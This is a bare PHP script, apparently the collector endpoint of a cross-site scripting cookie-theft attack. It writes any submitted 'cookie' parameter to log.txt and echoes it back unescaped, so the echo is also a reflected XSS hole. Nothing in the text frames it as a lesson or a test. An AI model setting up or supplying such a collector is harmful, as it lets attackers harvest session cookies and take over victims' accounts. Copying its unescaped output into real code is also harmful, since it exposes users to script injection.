<?php
	$file = fopen("log.txt", "a");
	fwrite($file, $_REQUEST["cookie"] . "\n");
	fclose($file);
	
	echo $_REQUEST["cookie"] . "<br>";
?>